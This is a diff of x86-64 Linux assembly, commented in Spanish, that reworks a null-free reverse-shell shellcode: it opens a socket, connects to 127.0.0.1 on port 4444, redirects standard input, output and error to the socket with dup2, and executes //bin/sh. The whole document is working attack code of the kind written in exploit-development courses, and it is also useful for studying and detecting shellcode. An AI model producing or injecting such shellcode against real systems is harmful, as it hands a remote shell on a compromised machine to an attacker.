@@ -3,74 +3,77 @@
 
 global _start
 
-
 section .text
 
 _start:
 
-xor rax, rax
-xor rdi, rdi
-xor rsi, rsi
-xor rdx, rdx
-xor r8, r8
+xor rcx, rcx
 
-
-push 0x2         ;int socket(int domain, int type, int protocol)
-pop rdi
-push 0x1
-pop rsi
-push 0x6
+push 0x29    ;int socket(int domain, int type, int protocol) (rdi, rsi, rdx)
+pop rax      ;#define __NR_socket 41
+push rcx
 pop rdx
-push 0x29       ;#define __NR_socket 41
-pop rax
+
+inc rcx
+push rcx
+pop rsi
+
+inc rcx
+push rcx
+pop rdi
 
 syscall
 
 mov r8, rax
 
-xor rsi, rsi
-xor r10, r10
+push 0x2a   ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+pop rax      ;#define __NR_connect 42
 
-push r10                       ;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
-mov byte[rsp], 0x2
-mov word[rsp+0x2], 0x5c11      ;puerto
-mov rsi, 0x12111190            ;protocolo
-sub rsi, 0x11111111            ;eliminar nulls para utilizarlo como opcodes
-mov [rsp+0x4], rsi
+push 0x0100007f   ;protocolo - add o sub para quitar nulls, 0x11111111
+push word 0x5c11  ;puerto
+push word 0x2     ;AF_INET
 
 mov rsi, rsp
-push byte 0x10
+
+push 0x10
 pop rdx
+
 push r8
 pop rdi
-push 0x2a                      ;#define __NR_connect 42
-pop rax
 
 syscall
 
 xor rsi, rsi
 push 0x3
-pop rsi
+pop rsi     
 
-dp:             int dup2(int oldfd, int newfd)  -> (send,recv,error)
-dec rsi
-push 0x21
+yumps:      ;int dup2(int oldfd, int newfd)  -> (send,recv,error)
+
+push 0x21   ;#define __NR_dup2 33
 pop rax
 syscall
-jne dp
 
-xor rdi, rdi    ;int execve(const char *fn, char *const argv[], char *const envp[])
-push rdi
-push rdi
-pop rsi
-pop rdx
-mov rdi, 0x68732f6e69622f2f   ;//bin/sh
-shr rdi, 0x8
-push rdi
-push rsp
-pop rdi
+dec rsi
+jns yumps
+
+
 push 0x3b
 pop rax
-syscall
 
+xor rbx, rbx   ;int execve(const char *fn, char *const argv[], char *const envp[])
+push rbx
+push rbx
+
+pop rsi
+pop rdx
+
+mov rdi, 0x68732f6e69622f2f  ;//bin/sh
+shr rdi, 0x8 
+push rdi
+push rsp
+
+pop rdi
+
+
+syscall
 
